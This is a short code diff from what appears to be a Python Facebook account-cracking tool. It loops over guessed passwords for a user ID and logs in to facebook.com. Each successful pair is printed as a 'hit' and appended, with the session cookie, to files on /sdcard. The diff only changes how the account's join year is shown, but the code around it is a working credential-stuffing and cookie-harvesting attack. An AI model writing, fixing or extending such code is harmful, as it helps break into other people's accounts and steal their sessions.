@@ -542,6 +542,7 @@ def gxds_files(uid, pxss):
     sys.stdout.flush()
     try:
         for ps in pxss:
+            yrs = +yxxr(uid)
             fb = "n"
             gxdsfbs = session.get(f"https://{fb}.facebook.com").text
             info = {
@@ -594,9 +595,9 @@ def gxds_files(uid, pxss):
                 )
                 xcki = coki.split("sb=")[1]
                 print(f"""\r\r{lgr}  [GXDS-HITS]
-                {yellow}EMAIL: {uid}
-                {yellow}PASS : {ps}
-                {yellow}JOINED: {yxxr}
+                EMAIL: {uid}
+                PASS : {ps}
+                JOINED: {yrs}
                 """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
@@ -606,7 +607,7 @@ def gxds_files(uid, pxss):
                 print(f"""\r\r{lr}  [GXDS-DEAD]
                 EMAIL: {uid}
                 PASS : {ps}
-                JOINED: {yxxr}
+                JOINED: {yrs}
                 """)
                 continue
         loop += 1
